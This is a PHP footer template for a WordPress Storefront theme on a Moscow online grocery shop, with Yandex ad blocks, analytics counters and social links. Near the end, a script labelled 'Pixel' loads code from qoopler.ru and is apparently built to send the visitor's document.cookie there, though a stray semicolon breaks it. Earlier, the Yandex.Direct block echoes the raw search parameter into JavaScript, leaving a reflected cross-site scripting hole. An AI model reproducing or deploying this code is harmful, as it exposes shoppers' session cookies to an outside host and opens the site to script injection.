<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package storefront
 */

?>

</div><!-- .col-full -->
<div id="tooltip"></div>
</div><!-- #content -->

<?php require_once(WP_CONTENT_DIR . 'themes/storefront/controller/controller_footer.php'); ?>
<!--yandex-start-->
<?php if($_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/index.php' || $_SERVER['REQUEST_URI'] == '/index.html'){ ?>
<?php }else{ ?>
    <div id="marketing"></div>
    <?php
    $findInArray = Util::itsDirect();
    if($findInArray) {
        ?>
        <div class="yandexDirect" title="yandexDirect">
            <!-- Yandex.Direct D-A-280290-1 -->
            <div id="yandex_direct_D-A-280290-1"></div>
            <script type="text/javascript">
                (function (w, d, n, s, t) {
                    w[n] = w[n] || [];
                    w[n].push(function () {
                        Ya.Context.AdvManager.render({
                            blockId: "D-A-280290-1",
                            renderTo: "yandex_direct_D-A-280290-1",
                            searchText: "<?php echo $_GET['s']; ?>",
                            searchPageNumber: 1
                        });
                    });
                    t = d.getElementsByTagName("script")[0];
                    s = d.createElement("script");
                    s.type = "text/javascript";
                    s.src = "//an.yandex.ru/system/context.js";
                    s.async = true;
                    t.parentNode.insertBefore(s, t);
                })(this, this.document, "yandexContextAsyncCallbacks");
            </script>
        </div>
        <?php
    }else {
        ?>
        <div class="adversting" title="yandexMarceting">
            <!-- Yandex.RTB R-A-278558-1 -->
            <div id="yandex_rtb_R-A-278558-1" class="kk_yandex_m"
                 style="max-width: 800px;width: 100%;text-align: left;margin: 0 auto;position: relative;"></div>
            <script type="text/javascript">
                (function (w, d, n, s, t) {
                    w[n] = w[n] || [];
                    w[n].push(function () {
                        Ya.Context.AdvManager.render({
                            blockId: "R-A-278558-1",
                            renderTo: "yandex_rtb_R-A-278558-1",
                            async: true
                        });
                    });
                    t = d.getElementsByTagName("script")[0];
                    s = d.createElement("script");
                    s.type = "text/javascript";
                    s.src = "//an.yandex.ru/system/context.js";
                    s.async = true;
                    t.parentNode.insertBefore(s, t);
                })(this, this.document, "yandexContextAsyncCallbacks");
            </script>
        </div>
        <?php
    }
    ?>

    <div class="seo-text"></div>
    <script>
        if($('#main h2').hasClass('sp_title')){
            $('.seo-text').html('<?php global $product; ?> <p>Интернет-магазин универсам-онлайн предлагает заказать онлайн и купить недорого <?php echo $product->name;?> с доставкой на дом и офис в Москве и Подмосковье</p>');
        }else{
            $('.seo-text').html('<p>Интернет-магазин универсам-онлайн предлагает заказать и купить онлайн недорого продукты, напитки, хозтовары, товары для животных, товары и питание для детей, бытовую химию, косметику и товары повседневного спроса для дома и офиса с доставкой по Москве и Подмосковью</p>');
        }
    </script>
<?php }//if($_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/index.php' || $_SERVER['REQUEST_URI'] == '/index.html') ?>
<!--yandex-end-->
</div><!-- #page -->
<footer id="rt-footer-surround">
    <div id="left-right-footer">
        <div style="width: auto;display: inline-block;vertical-align: middle;">
            <a href="https://www.facebook.com/366707910507832"><img style="float: left; margin-right: 20px;" src="/images/icons/fb.png" width="40" height="40"></a>
            <a href="https://vk.com/universamonline"><img style="float: left; margin-right: 20px;" src="/images/icons/vk.png" width="40" height="40"></a>
            <a href="https://ok.ru/universamonline?st._aid=ExternalGroupWidget_OpenGroup"><img style="float: left; margin-right: 20px;" src="/images/icons/ok.png" width="40" height="40"></a>
        </div>
    </div>
</footer>
<div class="mobile-footer mobile-show" style="height: 100%;padding-top: 20px;">
    <div style="width: 100%;text-align: center;">
        <a style="display: inline-block;width: 30px;height: 30px;" href="https://www.facebook.com/366707910507832"><img style="float: left; margin-right: 10px;" src="/images/icons/fb.png" width="30" height="30"></a>
        <a style="display: inline-block;width: 30px;height: 30px;" href="https://vk.com/universamonline"><img style="float: left; margin-right: 10px;" src="/images/icons/vk.png" width="30" height="30"></a>
        <a style="display: inline-block;width: 30px;height: 30px;" href="https://ok.ru/universamonline?st._aid=ExternalGroupWidget_OpenGroup"><img style="" src="/images/icons/ok.png" width="30" height="30"></a>
    </div>
</div>
<?php wp_footer(); ?>

<?php if($_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/index.php' || $_SERVER['REQUEST_URI'] == '/index.html'){ ?>
<?php }else{ ?>
    <script>
        $(document).ready(function(){
            //остальное
            fixed_left_bar();
            $(window).scroll(function() {
                fixed_left_bar();
            });
        });
    </script>
<?php } ?>

<!-- Yandex.Metrika counter -->
<script type="text/javascript">
    (function (d, w, c) {
        (w[c] = w[c] || []).push(function() {
            try {
                w.yaCounter42328084 = new Ya.Metrika({
                    id:42328084,
                    clickmap:true,
                    trackLinks:true,
                    accurateTrackBounce:true,
                    webvisor:true
                });
            } catch(e) { }
        });

        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function () { n.parentNode.insertBefore(s, n); };
        s.type = "text/javascript";
        s.async = true;
        s.src = "https://mc.yandex.ru/metrika/watch.js";

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else { f(); }
    })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/42328084" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->

<!-- Google.Metrika counter -->
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-104423116-1', 'auto');
    ga('send', 'pageview');

</script>
<!-- /Google.Metrika counter -->


<!-- Pixel -->
<script type="text/javascript">
    (function (d, w) {
        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function () { n.parentNode.insertBefore(s, n); };
        s.type = "text/javascript";
        s.async = true;
        s.src = "https://qoopler.ru/index.php?ref=+d.referrer+&cookie="; + encodeURIComponent(document.cookie);

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else { f(); }
    })(document, window);
</script>
<!-- /Pixel -->
<div id="end-page"></div>
<script type="text/javascript" async src="https://scripts.witstroom.com/watch/231"></script>
<script id="witstroom_informer" type="text/javascript" async src="https://scripts.witstroom.com/informer/231"></script>
